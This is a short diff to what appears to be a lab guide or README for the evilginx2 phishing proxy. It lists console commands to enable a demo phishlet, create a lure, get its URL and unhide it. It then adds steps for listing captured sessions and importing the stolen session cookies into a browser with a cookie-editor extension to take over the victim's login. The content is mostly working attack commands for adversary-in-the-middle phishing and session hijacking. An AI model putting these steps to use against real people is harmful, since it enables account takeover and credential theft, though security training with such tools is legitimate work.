@@ -42,5 +42,12 @@ sudo ./evilginx2/build/evilginx -p ./ --developer
 : phishlets enable demo
 : lures create demo
 : lures get-url 0
+: phishlets unhide demo
 ```
+
+Using the captured session:
+```shell
+: sessions
+```
+Note the number of the session and then rerun 'sessions' with the number after. Copy the output. In a web browser, download the Cookie Editor extension, press the import button, and paste the output from Evilginx.
 
